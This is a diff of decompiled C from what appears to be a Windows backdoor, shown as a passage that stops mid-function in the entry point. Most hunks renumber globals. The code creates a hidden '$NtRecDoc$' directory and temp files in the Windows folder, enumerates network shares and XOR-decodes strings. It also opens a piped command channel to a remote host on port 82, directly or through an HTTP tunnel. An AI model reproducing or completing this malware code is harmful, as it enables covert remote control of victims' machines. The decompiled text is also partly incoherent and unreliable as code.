             // branch -> 0x403dd3
         }
@@ -5951,10 +5969,10 @@ int32_t function_403dda(char * a1) {
     } else {
         int32_t str = (int32_t)a1 + 44; // 0x403dec
         char * found_char_pos = strrchr((char *)str, 46); // 0x403df2
-        if (g58 > 0) {
-            int32_t v5 = &g59; // esi
+        if (g63 > 0) {
+            int32_t v5 = &g64; // esi
             int32_t v6 = v2; // 0x403e17
-            int32_t v7 = &g59; // 0x403e17
+            int32_t v7 = &g64; // 0x403e17
             // branch -> 0x403e17
             while (true) {
                 // 0x403e17
@@ -6053,7 +6071,7 @@ int32_t function_403dda(char * a1) {
                 *v10 = *v10 + 1;
                 int32_t v11 = v5 + 4; // 0x403e6d
                 v5 = v11;
-                if (*(int32_t *)(g8 + 24) >= g58) {
+                if (*(int32_t *)(g8 + 24) >= g63) {
                     // break -> 0x403e7c
                     break;
                 }
@@ -6098,7 +6116,7 @@ int32_t function_403eae(struct _WIN32_FIND_DATAA * a1, uint32_t a2) {
     g2 = (int32_t)&lpFindFileData2;
     int32_t v1; // 0x4040bf
     int32_t result; // 0x4040c3
-    if (g26 != 0) {
+    if (g31 != 0) {
         // 0x4040b8
         v1 = g8;
         result = 0;
@@ -6166,7 +6184,7 @@ int32_t function_403eae(struct _WIN32_FIND_DATAA * a1, uint32_t a2) {
                                     if (v20 != 0) {
                                         // 0x403f8a
                                         *v21 = 0xea60;
-                                        *(int32_t *)g8 = g22;
+                                        *(int32_t *)g8 = g27;
                                         if (WaitForSingleObject(hFindFile, (int32_t)lpFindFileData2) != g3) {
                                             // 0x403f8a
                                             v18 = g8;
@@ -6260,7 +6278,7 @@ int32_t function_403eae(struct _WIN32_FIND_DATAA * a1, uint32_t a2) {
                                     if (v23 != 0) {
                                         // 0x404030
                                         *v24 = 0xea60;
-                                        *(int32_t *)g8 = g22;
+                                        *(int32_t *)g8 = g27;
                                         if (WaitForSingleObject(hFindFile, (int32_t)lpFindFileData2) != g3) {
                                             // 0x404041
                                             *(int32_t *)(g8 - 4) = v10;
@@ -6271,7 +6289,7 @@ int32_t function_403eae(struct _WIN32_FIND_DATAA * a1, uint32_t a2) {
                                             if (v25 != 0) {
                                                 // 0x404055
                                                 *v26 = 0xea60;
-                                                *(int32_t *)g8 = g22;
+                                                *(int32_t *)g8 = g27;
                                                 if (WaitForSingleObject(hFindFile, (int32_t)lpFindFileData2) != g3) {
                                                     // 0x404066
                                                     if (a2 != 79) {
@@ -6426,14 +6444,14 @@ int32_t function_4040c4(void) {
     g2 = &v2;
     int32_t lpBuffer; // bp-516
     int32_t v3 = &lpBuffer; // 0x4040c7
-    g63 = 79;
+    g68 = 79;
     function_403e89(v1);
     GetWindowsDirectoryA((char *)&lpBuffer, 512);
     strcat((char *)&lpBuffer, "\\$NtRecDoc$");
     CreateDirectoryA((char *)&lpBuffer, NULL);
     int32_t v4 = GetFileAttributesA((char *)&lpBuffer); // 0x404114
     SetFileAttributesA((char *)&lpBuffer, v4 | 2);
-    int32_t result = function_404140((struct _WIN32_FIND_DATAA *)*(int32_t *)&g33, v3); // 0x404137
+    int32_t result = function_404140((struct _WIN32_FIND_DATAA *)*(int32_t *)&g38, v3); // 0x404137
     g4 = v3;
     g2 = v2;
     return result;
@@ -6448,7 +6466,7 @@ int32_t function_404140(struct _WIN32_FIND_DATAA * a1, int32_t a2) {
     int32_t v3 = g5; // bp-3684
     int32_t v4; // 0x40434f
     int32_t result; // 0x404353
-    if (g26 != 0) {
+    if (g31 != 0) {
         // 0x40433f
         v4 = &v3;
         result = 0;
@@ -6496,7 +6514,7 @@ int32_t function_404140(struct _WIN32_FIND_DATAA * a1, int32_t a2) {
                             int32_t v24; // bp-24
                             *v23 = (int32_t)&v24;
                             GetLocalTime((struct _SYSTEMTIME *)hFindFile);
-                            *(int32_t *)(g8 - 4) = g73;
+                            *(int32_t *)(g8 - 4) = g78;
                             uint16_t v25;
                             *(int32_t *)(g8 - 8) = (int32_t)v25;
                             uint16_t v26;
@@ -6508,7 +6526,7 @@ int32_t function_404140(struct _WIN32_FIND_DATAA * a1, int32_t a2) {
                             *(int32_t *)(g8 - 24) = (int32_t)"%02u%02u%02u%02u%05d";
                             *(int32_t *)(g8 - 28) = v12;
                             sprintf((char *)&str2, (char *)&str2);
-                            int32_t v29 = g73; // 0x40429d
+                            int32_t v29 = g78; // 0x40429d
                             int32_t v30 = v29 + 1;
                             if (v29 > 0x1869f) {
                                 // 0x4042b2
@@ -6516,7 +6534,7 @@ int32_t function_404140(struct _WIN32_FIND_DATAA * a1, int32_t a2) {
                                 // branch -> 0x4042b9
                             }
                             // 0x4042b9
-                            g73 = v30;
+                            g78 = v30;
                             *(int32_t *)(g8 + 24) = 46;
                             *(int32_t *)(g8 + 20) = v10;
                             char * found_char_pos = strrchr((char *)hFindFile, (int32_t)lpFindFileData2); // 0x4042c2
@@ -6554,11 +6572,11 @@ int32_t function_404140(struct _WIN32_FIND_DATAA * a1, int32_t a2) {
                             // branch -> 0x404198
                         } else {
                             // 0x4041db
-                            *v23 = g73;
+                            *v23 = g78;
                             *(int32_t *)g8 = (int32_t)"%05d";
                             *(int32_t *)(g8 - 4) = v16;
                             sprintf((char *)&str2, (char *)&str2);
-                            int32_t v32 = g73; // 0x4041ef
+                            int32_t v32 = g78; // 0x4041ef
                             int32_t v33 = v32 + 1;
                             if (v32 > 0x1869f) {
                                 // 0x404204
@@ -6566,7 +6584,7 @@ int32_t function_404140(struct _WIN32_FIND_DATAA * a1, int32_t a2) {
                                 // branch -> 0x40420b
                             }
                             // 0x40420b
-                            g73 = v33;
+                            g78 = v33;
                             *(int32_t *)(g8 + 8) = v10;
                             *(int32_t *)(g8 + 4) = v5;
                             *(int32_t *)g8 = g5;
@@ -6681,9 +6699,9 @@ int32_t function_40439c(int32_t * a1, int32_t a2) {
     function_405a10();
     g3 = 1;
     char v2 = 83; // 0x4043f9
-    if (g31 != 83) {
+    if (g36 != 83) {
         // 0x4043bc
-        v2 = g31 == 89 ? 89 : 69;
+        v2 = g36 == 89 ? 89 : 69;
         // branch -> 0x4043d7
     }
     char v3 = v2; // bp-8204
@@ -6697,7 +6715,7 @@ int32_t function_40439c(int32_t * a1, int32_t a2) {
         int32_t result; // 0x404510
         if (v2 != 89) {
             // 0x404421
-            g63 = 85;
+            g68 = 85;
             int32_t v5;
             function_403e89(v5);
             // branch -> 0x404460
@@ -6740,7 +6758,7 @@ int32_t function_40439c(int32_t * a1, int32_t a2) {
         struct _IO_FILE * file2;
         int32_t v14; // 0x4044f3
         int32_t * v15; // 0x4044f3
-        if (g26 != v13) {
+        if (g31 != v13) {
             // 0x4044e0
             file2 = (struct _IO_FILE *)v13;
             // branch -> 0x4044e3
@@ -6750,7 +6768,7 @@ int32_t function_40439c(int32_t * a1, int32_t a2) {
             v14 = g8;
             v15 = (int32_t *)v14;
             g4 = *v15;
-            if (g31 == 65) {
+            if (g36 == 65) {
                 // 0x4044f6
                 *v15 = g5;
                 *(int32_t *)(v14 - 4) = a2;
@@ -6802,7 +6820,7 @@ int32_t function_40439c(int32_t * a1, int32_t a2) {
                 if (g3 == g7) {
                     // 0x4044d8
                     v18 = g5;
-                    if (g26 != v18) {
+                    if (g31 != v18) {
                         // break -> 0x4044e0
                         break;
                     }
@@ -6819,7 +6837,7 @@ int32_t function_40439c(int32_t * a1, int32_t a2) {
             v14 = g8;
             v15 = (int32_t *)v14;
             g4 = *v15;
-            if (g31 == 65) {
+            if (g36 == 65) {
                 // 0x4044f6
                 *v15 = g5;
                 *(int32_t *)(v14 - 4) = a2;
@@ -6847,7 +6865,7 @@ int32_t function_40439c(int32_t * a1, int32_t a2) {
         v14 = g8;
         v15 = (int32_t *)v14;
         g4 = *v15;
-        if (g31 == 65) {
+        if (g36 == 65) {
             // 0x4044f6
             *v15 = g5;
             *(int32_t *)(v14 - 4) = a2;
@@ -6879,7 +6897,7 @@ int32_t function_40439c(int32_t * a1, int32_t a2) {
 
 // Address range: 0x404511 - 0x404524
 int32_t function_404511(void) {
-    struct _NETRESOURCEA * v1 = g33; // 0x404511
+    struct _NETRESOURCEA * v1 = g38; // 0x404511
     int32_t v2 = (int32_t)v1 + 4; // 0x404516
     g4 = v2;
     int32_t result = function_40439c((int32_t *)v1->e0, v2); // 0x40451c
@@ -6890,44 +6908,44 @@ int32_t function_404511(void) {
 // Address range: 0x404524 - 0x404569
 int32_t function_404524(int32_t a1) {
     // 0x404524
-    function_404354((char *)g33, 70);
+    function_404354((char *)g38, 70);
     g4 = 70;
-    if (WaitForSingleObject((int32_t *)g22, 0xea60) == 258) {
+    if (WaitForSingleObject((int32_t *)g27, 0xea60) == 258) {
         // 0x404568
         return 258;
     }
-    int32_t v1 = *(int32_t *)&g33; // 0x40454f2
+    int32_t v1 = *(int32_t *)&g38; // 0x40454f2
     function_403eae((struct _WIN32_FIND_DATAA *)v1, 0xea60);
-    g63 = 71;
+    g68 = 71;
     return function_403e89(v1);
 }
 
 // Address range: 0x404569 - 0x4045cb
 int32_t function_404569(void) {
     // 0x404569
-    g7 = (int32_t)&g70;
-    GetWindowsDirectoryA((char *)&g70, 255);
+    g7 = (int32_t)&g75;
+    GetWindowsDirectoryA((char *)&g75, 255);
     strcat((char *)g7, "\\ZJRsv.tem");
     g5 = 0x683a;
     g4 = (int32_t)"\\ZJRsv.tem";
     char * lpFileName = (char *)g7; // 0x404590
     DeleteFileA(lpFileName);
-    char * found_char_pos = strrchr((char *)*(int32_t *)&g33, 92); // 0x40459b
+    char * found_char_pos = strrchr((char *)*(int32_t *)&g38, 92); // 0x40459b
     int32_t v1 = (int32_t)found_char_pos; // 0x40459b
     g1 = v1;
     function_403d8d(v1);
     *found_char_pos = 0;
-    function_403eae((struct _WIN32_FIND_DATAA *)*(int32_t *)&g33, 89);
+    function_403eae((struct _WIN32_FIND_DATAA *)*(int32_t *)&g38, 89);
     function_40439c(NULL, g7);
     int32_t lpFileName2 = g7; // 0x4045c4
     g7 = (int32_t)lpFileName;
-    g3 = (int32_t)(char *)&g70;
+    g3 = (int32_t)(char *)&g75;
     return DeleteFileA((char *)lpFileName2);
 }
 
 // Address range: 0x4045cb - 0x404629
 int32_t function_4045cb(void) {
-    struct _IO_FILE * file = fopen((char *)&g70, "ab"); // 0x4045d6
+    struct _IO_FILE * file = fopen((char *)&g75, "ab"); // 0x4045d6
     int32_t result; // 0x404628
     if (file != NULL) {
         // 0x4045e4
@@ -6949,8 +6967,8 @@ int32_t function_4045cb(void) {
 // Address range: 0x404629 - 0x404655
 int32_t function_404629(void) {
     // 0x404629
-    GetWindowsDirectoryA((char *)*(int32_t *)&g33, 512);
-    strcat((char *)*(int32_t *)&g33, "X JpQjejop]hhG>5,,3.3 ");
+    GetWindowsDirectoryA((char *)*(int32_t *)&g38, 512);
+    strcat((char *)*(int32_t *)&g38, "X JpQjejop]hhG>5,,3.3 ");
     return function_404524(79);
 }
 
@@ -6977,17 +6995,17 @@ int32_t function_404655(void) {
     int32_t v14; // 0x404791
     int32_t v15; // 0x4047c7
     int32_t * stream;
-    if (g27 != 0) {
+    if (g32 != 0) {
         // 0x40473a
-        g7 = (int32_t)&g21;
-        v4 = (char *)&g21;
-        struct _IO_FILE * file = fopen((char *)&g21, "ab"); // 0x404745
+        g7 = (int32_t)&g26;
+        v4 = (char *)&g26;
+        struct _IO_FILE * file = fopen((char *)&g26, "ab"); // 0x404745
         g3 = (int32_t)file;
         if (file != NULL) {
             // 0x404769
-            g5 = (int32_t)g33;
+            g5 = (int32_t)g38;
             v10 = v3;
-            v5 = (int32_t)g30;
+            v5 = (int32_t)g35;
             // branch -> 0x404774
             // 0x404774
             v13 = (int32_t)&file3;
@@ -7007,17 +7025,17 @@ int32_t function_404655(void) {
             fwrite(&file3->e0, size, nmemb, (struct _IO_FILE *)&stream);
             *(int32_t *)(g8 - 4) = g3;
             v14 = fclose((struct _IO_FILE *)file3);
-            if (g57 != 0) {
+            if (g62 != 0) {
                 // 0x4047a3
-                g57 = 0;
-                g63 = 79;
+                g62 = 0;
+                g68 = 79;
                 function_403e89((int32_t)file3);
                 *(int32_t *)(g8 - 4) = g7;
                 v6 = function_4047d2();
                 v7 = g8;
                 v12 = (int32_t *)v7;
                 g4 = *v12;
-                if (g31 == 86) {
+                if (g36 == 86) {
                     // 0x4047c6
                     *v12 = g7;
                     v15 = function_40511a((char *)file3);
@@ -7039,7 +7057,7 @@ int32_t function_404655(void) {
             fclose(file);
             // branch -> 0x40475b
             // 0x40475b
-            g63 = 69;
+            g68 = 69;
             result = function_403e89((int32_t)(struct _NETRESOURCEA *)file);
             v9 = g8;
             // branch -> 0x4047cd
@@ -7051,8 +7069,8 @@ int32_t function_404655(void) {
         return result;
     }
     // 0x40466f
-    g27 = 1;
-    int32_t str = (int32_t)g33 + 4; // 0x40467e
+    g32 = 1;
+    int32_t str = (int32_t)g38 + 4; // 0x40467e
     int32_t len = strlen((char *)str); // 0x404682
     g5 = len;
     g4 = str;
@@ -7065,21 +7083,21 @@ int32_t function_404655(void) {
         return len;
     }
     // 0x404699
-    g7 = (int32_t)&g21;
-    int32_t str2 = (int32_t)g33 + 4; // 0x4046a3
+    g7 = (int32_t)&g26;
+    int32_t str2 = (int32_t)g38 + 4; // 0x4046a3
     struct _NETRESOURCEA * v16 = (struct _NETRESOURCEA *)str2; // bp-284
-    v4 = (char *)&g21;
-    strcpy((char *)&g21, (char *)str2);
+    v4 = (char *)&g26;
+    strcpy((char *)&g26, (char *)str2);
     int32_t v17 = v3; // 0x4046f8
     char * dwFileAttributes;
     char * str3; // 0x4046ef
-    if (g31 == 86) {
+    if (g36 == 86) {
         int32_t v18 = (int32_t)&v4; // 0x4046a7
         v16 = (struct _NETRESOURCEA *)256;
         int32_t lpBuffer; // bp-268
         v4 = (char *)&lpBuffer;
         GetWindowsDirectoryA((char *)&lpBuffer, 256);
-        strcat((char *)&lpBuffer, g13);
+        strcat((char *)&lpBuffer, g17);
         strcat((char *)&lpBuffer, (char *)g7);
         str3 = (char *)g7;
         strcpy(str3, (char *)&lpBuffer);
@@ -7091,7 +7109,7 @@ int32_t function_404655(void) {
     *(int32_t *)(v17 - 4) = v1;
     *(int32_t *)(v17 - 8) = g7;
     SetFileAttributesA(str3, (int32_t)dwFileAttributes);
-    int32_t v19 = g33->e0; // 0x404705
+    int32_t v19 = g38->e0; // 0x404705
     int32_t v20 = v19 == v1 ? (int32_t)"wb" : (int32_t)"ab";
     *(int32_t *)(g8 - 4) = v20;
     *(int32_t *)(g8 - 8) = g7;
@@ -7101,15 +7119,15 @@ int32_t function_404655(void) {
         // 0x4046f8
         // branch -> 0x40475b
         // 0x40475b
-        g63 = 69;
+        g68 = 69;
         result = function_403e89((int32_t)v16);
         v9 = g8;
         // branch -> 0x4047cd
     } else {
         // 0x404724
-        g5 += (int32_t)g33 + 5;
+        g5 += (int32_t)g38 + 5;
         v10 = g8 + 8;
-        v5 = (int32_t)g30 - len - 5;
+        v5 = (int32_t)g35 - len - 5;
         // branch -> 0x404774
         // 0x404774
         v13 = (int32_t)&file3;
@@ -7128,17 +7146,17 @@ int32_t function_404655(void) {
         fwrite(&file3->e0, size, nmemb, (struct _IO_FILE *)&stream);
         *(int32_t *)(g8 - 4) = g3;
         v14 = fclose((struct _IO_FILE *)file3);
-        if (g57 != 0) {
+        if (g62 != 0) {
             // 0x4047a3
-            g57 = 0;
-            g63 = 79;
+            g62 = 0;
+            g68 = 79;
             function_403e89((int32_t)file3);
             *(int32_t *)(g8 - 4) = g7;
             v6 = function_4047d2();
             v7 = g8;
             v12 = (int32_t *)v7;
             g4 = *v12;
-            if (g31 == 86) {
+            if (g36 == 86) {
                 // 0x4047c6
                 *v12 = g7;
                 v15 = function_40511a((char *)file3);
@@ -7241,7 +7259,7 @@ int32_t function_404905(void) {
     g5 = 2;
     g3 = 0;
     struct _NETRESOURCEA * v2 = NULL; // bp-24
-    *(int32_t *)&v2 = *(int32_t *)&g33;
+    *(int32_t *)&v2 = *(int32_t *)&g38;
     int32_t v3 = (int32_t)&v2; // 0x404923
     int32_t ** lpNetResource = (int32_t **)2; // bp-64
     dwBytes = (int32_t **)0x4000;
@@ -7358,7 +7376,7 @@ int32_t function_404905(void) {
         } else {
             // 0x404995
             dwBytes = (int32_t **)str5;
-            int32_t str4 = *(int32_t *)&g33; // 0x40499710
+            int32_t str4 = *(int32_t *)&g38; // 0x40499710
             *(int32_t *)&v2 = str4;
             strcpy((char *)str4, (char *)str5);
             g4 = (int32_t)dwBytes;
@@ -7371,7 +7389,7 @@ int32_t function_404905(void) {
         g3 = *(int32_t *)(v10 + 8);
         return result2;
     }
-    int32_t str6 = *(int32_t *)&g33; // 0x4049b912
+    int32_t str6 = *(int32_t *)&g38; // 0x4049b912
     *(int32_t *)&v2 = str6;
     char * found_char_pos2 = strrchr((char *)str6, 92); // 0x4049c5
     int32_t v18 = (int32_t)found_char_pos2; // 0x4049c5
@@ -7405,7 +7423,7 @@ int32_t function_404905(void) {
     }
     // 0x4049d1
     *found_char_pos2 = (char)v19;
-    struct _NETRESOURCEA * str8 = g33; // 0x4049d3
+    struct _NETRESOURCEA * str8 = g38; // 0x4049d3
     int32_t v20 = (int32_t)str8; // 0x4049d3
     g4 = v20;
     if (v18 == v20) {
@@ -7598,8 +7616,8 @@ int32_t function_404905(void) {
         if (v36 != g3) {
             int32_t dwScope2 = g5; // 0x4049ec
             g4 = v36 + 1;
-            struct _NETRESOURCEA * v37 = g33; // 0x404a15
-            if (g66 != dwScope2) {
+            struct _NETRESOURCEA * v37 = g38; // 0x404a15
+            if (g71 != dwScope2) {
                 // 0x404a15
                 if (found_char_pos4 != (char *)v37) {
                     str7 = NULL;
@@ -7760,7 +7778,7 @@ int32_t function_404b80(void) {
     int32_t result;
     int32_t v1;
     int32_t v2;
-    if (g66 != 1) {
+    if (g71 != 1) {
         // 0x404b9c
         result = function_404ba8((char *)v1, v2);
         // branch -> 0x404ba5
@@ -7790,9 +7808,9 @@ int32_t function_404ba8(char * a1, int32_t lpWideCharStr) {
     char ** v5;
     if (v4 == NULL) {
         // 0x404be9
-        str3 = (char *)&g74;
+        str3 = (char *)&g79;
         str2 = &str;
-        strcpy(&str, (char *)&g74);
+        strcpy(&str, (char *)&g79);
         v5 = &v3;
         // branch -> 0x404bf9
     } else {
@@ -7915,13 +7933,13 @@ int32_t function_404dde(char * a1, int32_t a2) {
     g2 = &v1;
     char * str2 = (char *)42; // bp-872
     int32_t v2; // bp-200
-    __asm_rep_movsd_memcpy((char *)&v2, (char *)&g20, 34);
+    __asm_rep_movsd_memcpy((char *)&v2, (char *)&g24, 34);
     str2 = (char *)55;
     int32_t v3; // bp-372
-    __asm_rep_movsd_memcpy((char *)&v3, (char *)&g19, 42);
+    __asm_rep_movsd_memcpy((char *)&v3, (char *)&g23, 42);
     int32_t v4 = 0; // eax
     int32_t v5; // bp-596
-    __asm_rep_movsd_memcpy((char *)&v5, (char *)&g18, 55);
+    __asm_rep_movsd_memcpy((char *)&v5, (char *)&g22, 55);
     char * v6 = (char *)(v4 - 196 + g2); // 0x404e22
     *v6 = *v6 ^ -109;
     int32_t v7 = v4 + 1; // 0x404e2a
@@ -7965,7 +7983,7 @@ int32_t function_404dde(char * a1, int32_t a2) {
     int32_t v14;
     if (v13 == NULL) {
         // 0x404e73
-        str = (char *)&g74;
+        str = (char *)&g79;
         v14 = (int32_t)&str;
         // branch -> 0x404e78
     } else {
@@ -8212,7 +8230,7 @@ int32_t function_404fd1(void) {
 // Address range: 0x405103 - 0x405119
 int32_t function_405103(void) {
     // 0x405103
-    function_4015d4((char *)&g50, 0);
+    function_4015d4((char *)&g55, 0);
     g4 = 0;
     ExitProcess(1);
     // UNREACHABLE
@@ -8409,10 +8427,10 @@ int32_t function_40511a(char * str) {
 int32_t function_4051f5(void) {
     int32_t v1 = g4; // 0x4051f5
     int32_t lpThreadId = v1; // bp-4
-    g63 = 79;
+    g68 = 79;
     function_403e89(v1);
     int32_t threadHandle; // 0x405221
-    if (g55 == 0) {
+    if (g60 == 0) {
         // 0x40520c
         threadHandle = (int32_t)CreateThread(NULL, 0, (int32_t (*)(int32_t *))0x405222, NULL, 0, &lpThreadId);
         // branch -> 0x405220
@@ -8442,7 +8460,7 @@ int32_t function_405222(void) {
     int32_t nSize = 0; // esi
     int32_t hReadPipe = 0; // bp-36
     buf = NULL;
-    g55 = 1;
+    g60 = 1;
     int32_t ** lpPipeAttributes = (int32_t **)12; // bp-48
     CreatePipe((int32_t **)12, NULL, (struct _SECURITY_ATTRIBUTES *)1, 0);
     struct _SECURITY_ATTRIBUTES * lpCommandLine = (struct _SECURITY_ATTRIBUTES *)&lpPipeAttributes; // bp-56
@@ -8467,14 +8485,14 @@ int32_t function_405222(void) {
         *(int32_t *)(v4 - 8) = (int32_t)lpProcessInformation;
         v5 = (int32_t *)(v4 - 12);
         *v5 = 1;
-        g55 = g7;
+        g60 = g7;
         return *v5;
     }
-    char * str2 = g56 == v3 ? "!!Connect Directly!!\n" : "!!Connect Through HTTP Tunnel!!\n";
+    char * str2 = g61 == v3 ? "!!Connect Directly!!\n" : "!!Connect Through HTTP Tunnel!!\n";
     int32_t str; // bp-396
     strcpy((char *)&str, str2);
     int32_t lpBytesLeftThisMessage = strlen((char *)&str) + 4; // 0x40533c
-    int32_t v6 = *(int32_t *)&g39; // 0x40534931
+    int32_t v6 = *(int32_t *)&g44; // 0x40534931
     struct _SECURITY_ATTRIBUTES * v7 = NULL; // bp-128
     *(int32_t *)&v7 = v6;
     in = (struct in_addr){
@@ -8590,7 +8608,7 @@ int32_t function_405222(void) {
                             *(int32_t *)(v4 - 8) = (int32_t)lpProcessInformation;
                             v5 = (int32_t *)(v4 - 12);
                             *v5 = 1;
-                            g55 = g7;
+                            g60 = g7;
                             return *v5;
                         }
                         hFile = v13;
@@ -8611,7 +8629,7 @@ int32_t function_405222(void) {
             *(int32_t *)(v4 - 8) = (int32_t)lpProcessInformation;
             v5 = (int32_t *)(v4 - 12);
             *v5 = 1;
-            g55 = g7;
+            g60 = g7;
             return *v5;
         }
         // 0x4053f2
@@ -8624,7 +8642,7 @@ int32_t function_405222(void) {
             // 0x405412
             int32_t v23;
             char * str4;
-            if (g56 != g7) {
+            if (g61 != g7) {
                 // 0x40541a
                 *(int32_t *)(g8 - 4) = (int32_t)v12;
                 closesocket(-1);
@@ -8647,7 +8665,7 @@ int32_t function_405222(void) {
                 *(int32_t *)(v4 - 8) = (int32_t)lpProcessInformation;
                 v5 = (int32_t *)(v4 - 12);
                 *v5 = 1;
-                g55 = g7;
+                g60 = g7;
                 return *v5;
             }
             str4 = v12;
@@ -8656,9 +8674,9 @@ int32_t function_405222(void) {
             // 0x40543b
             *(int32_t *)(g8 - 4) = (int32_t)buf + 4;
             *(int32_t *)(g8 - 8) = 1;
-            *(int32_t *)(g8 - 12) = (int32_t)&g74;
+            *(int32_t *)(g8 - 12) = (int32_t)&g79;
             *(int32_t *)(g8 - 16) = 82;
-            *(int32_t *)(g8 - 20) = (int32_t)g39;
+            *(int32_t *)(g8 - 20) = (int32_t)g44;
             int32_t sock3 = (int32_t)str4; // 0x405451
             in2 = (struct in_addr){
                 .e0 = 0
@@ -8714,7 +8732,7 @@ int32_t function_405222(void) {
             *(int32_t *)(v4 - 8) = (int32_t)lpProcessInformation;
             v5 = (int32_t *)(v4 - 12);
             *v5 = 1;
-            g55 = g7;
+            g60 = g7;
             return *v5;
         }
         // 0x40552c
@@ -8727,7 +8745,7 @@ int32_t function_405222(void) {
         *(int32_t *)(v4 - 8) = (int32_t)lpProcessInformation;
         v5 = (int32_t *)(v4 - 12);
         *v5 = 1;
-        g55 = g7;
+        g60 = g7;
         return *v5;
     }
 }
@@ -8737,7 +8755,7 @@ int32_t function_40554c(void) {
     int32_t v1 = g2; // 0x40554c
     int16_t v2; // bp-20
     int32_t v3 = &v2; // 0x40554f
-    int32_t addr = (int32_t)g39; // esi
+    int32_t addr = (int32_t)g44; // esi
     int32_t v4 = 82; // edi
     int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x405564
     int32_t v5; // 0x4055c8
@@ -8752,11 +8770,11 @@ int32_t function_40554c(void) {
         return 0;
     }
     // 0x405571
-    if (g62 != NULL) {
+    if (g67 != NULL) {
         // 0x40557a
-        if (g56 != 0) {
-            int32_t v6 = inet_addr((char *)&g60); // 0x405588
-            v4 = g61;
+        if (g61 != 0) {
+            int32_t v6 = inet_addr((char *)&g65); // 0x405588
+            v4 = g66;
             addr = v6;
             // branch -> 0x405596
         }
@@ -8826,7 +8844,7 @@ int32_t function_4055f3(void) {
     } else {
         int32_t v8 = v4 + 5; // 0x40560e
         *(char *)mem = 97;
-        struct _NETRESOURCEA * v9 = g33; // 0x405615
+        struct _NETRESOURCEA * v9 = g38; // 0x405615
         int32_t v10 = function_40576c((char *)v9->e0, (int32_t)v9 + 4, v8); // 0x405620
         int32_t v11 = v10 + 5; // 0x405625
         v1 = v10;
@@ -8834,7 +8852,7 @@ int32_t function_4055f3(void) {
         int32_t v12 = v11 + 1; // 0x40562f
         g5 = v12;
         int32_t v13 = v12 + v4; // 0x405630
-        struct _NETRESOURCEA * v14 = g33; // 0x405634
+        struct _NETRESOURCEA * v14 = g38; // 0x405634
         int32_t v15 = function_4057de((int32_t *)v14->e0, (int32_t)v14 + 4, v13); // 0x40563f
         v1 = v15;
         int32_t v16 = g5 + v15; // 0x40564a
@@ -8857,11 +8875,11 @@ int32_t function_4055f3(void) {
 
 // Address range: 0x405676 - 0x4056ae
 int32_t function_405676(void) {
-    int32_t str = (int32_t)g33 + 4; // 0x40567c
+    int32_t str = (int32_t)g38 + 4; // 0x40567c
     int32_t len = strlen((char *)str); // 0x405680
-    int32_t v1 = g33->e0; // 0x405690
+    int32_t v1 = g38->e0; // 0x405690
     function_405957((int32_t *)v1, str, len + 1 + str);
-    g63 = 69;
+    g68 = 69;
     int32_t result = function_403e89(v1); // 0x4056a7
     return result;
 }
@@ -8869,7 +8887,7 @@ int32_t function_405676(void) {
 // Address range: 0x4056ae - 0x4056fc
 int32_t function_4056ae(void) {
     int32_t v1 = g7; // 0x4056b3
-    int32_t str = (int32_t)g33 + 4; // 0x4056b5
+    int32_t str = (int32_t)g38 + 4; // 0x4056b5
     g7 = str;
     int32_t str2 = strlen((char *)str) + 1 + g7; // 0x4056be
     g5 = str2;
@@ -8878,9 +8896,9 @@ int32_t function_4056ae(void) {
     int32_t v3 = *(int32_t *)(len + 5 + v2); // 0x4056c8
     int32_t v4 = len + 1 + v2; // 0x4056cc
     int32_t v5 = *(int32_t *)v4; // 0x4056d4
-    int32_t v6 = g33->e0; // 0x4056dd
+    int32_t v6 = g38->e0; // 0x4056dd
     function_405908((int32_t *)v6, g7, v2, v5, v4 + 8, v3);
-    g63 = 69;
+    g68 = 69;
     int32_t result = function_403e89(v6); // 0x4056f4
     g7 = v1;
     return result;
@@ -8889,13 +8907,13 @@ int32_t function_4056ae(void) {
 // Address range: 0x4056fc - 0x405734
 int32_t function_4056fc(void) {
     int32_t v1 = g7; // 0x405701
-    int32_t str = (int32_t)g33 + 4; // 0x405702
+    int32_t str = (int32_t)g38 + 4; // 0x405702
     g7 = str;
     int32_t len = strlen((char *)str); // 0x405706
     int32_t v2 = g7; // 0x40570b
-    int32_t v3 = g33->e0; // 0x405716
+    int32_t v3 = g38->e0; // 0x405716
     function_40586a((int32_t *)v3, v2, len + 1 + v2);
-    g63 = 69;
+    g68 = 69;
     int32_t result = function_403e89(v3); // 0x40572d
     g7 = v1;
     return result;
@@ -8904,13 +8922,13 @@ int32_t function_4056fc(void) {
 // Address range: 0x405734 - 0x40576c
 int32_t function_405734(void) {
     int32_t v1 = g7; // 0x405739
-    int32_t str = (int32_t)g33 + 4; // 0x40573a
+    int32_t str = (int32_t)g38 + 4; // 0x40573a
     g7 = str;
     int32_t len = strlen((char *)str); // 0x40573e
     int32_t v2 = g7; // 0x405743
-    int32_t v3 = g33->e0; // 0x40574e
+    int32_t v3 = g38->e0; // 0x40574e
     function_4058c4((int32_t *)v3, v2, len + 1 + v2);
-    g63 = 69;
+    g68 = 69;
     int32_t result = function_403e89(v3); // 0x405765
     g7 = v1;
     return result;
@@ -9220,8 +9238,211 @@ int32_t function_405a40(char * s1, char * s2) {
 
 // Address range: 0x405a46 - 0x405b84
 int32_t entry_point(void) {
-    // 0x405a46
-    abort();
+    int32_t v1 = __readfsdword(0); // bp-20
+    __writefsdword(0, (int32_t)&v1);
+    g3 = 0;
+    __set_app_type(2);
+    g84 = -1;
+    g85 = -1;
+    *__p__fmode() = g83;
+    int32_t * v2 = __p__commode(); // 0x405a96
+    g4 = g82;
+    *v2 = g82;
+    g1 = 0x6a66;
+    g86 = (char *)0x6a66;
+    function_405bc5();
+    if (g25 == g3) {
+        // 0x405abd
+        __setusermatherr(0x405bc2);
+        g4 = 0x405bc2;
+        // branch -> 0x405ac9
+    }
+    // 0x405ac9
+    __setdefaultprecision();
+    _initterm((void (**)())&g12, (void (**)())&g13);
+    int32_t v3 = g81; // bp-112
+    int32_t v4 = 0; // bp-104
+    int32_t v5 = 0; // bp-116
+    int32_t v6 = 0; // bp-100
+    __getmainargs(&v6, (char ***)&v5, (char ***)&v4, g80, &v3);
+    _initterm((void (**)())&g10, (void (**)())&g11);
+    int32_t v7 = *(int32_t *)0x406150; // 0x405b13
+    int32_t v8 = *(int32_t *)v7; // 0x405b18
+    g7 = v8;
+    char * v9 = (char *)v8; // 0x405b1d
+    int32_t lpStartupInfo; // bp-96
+    int32_t v10; // 0x405b39
+    int32_t v11; // 0x405b43
+    int32_t v12; // 0x405b35
+    unsigned char v13; // 0x405b39
+    int32_t status; // 0x405b75
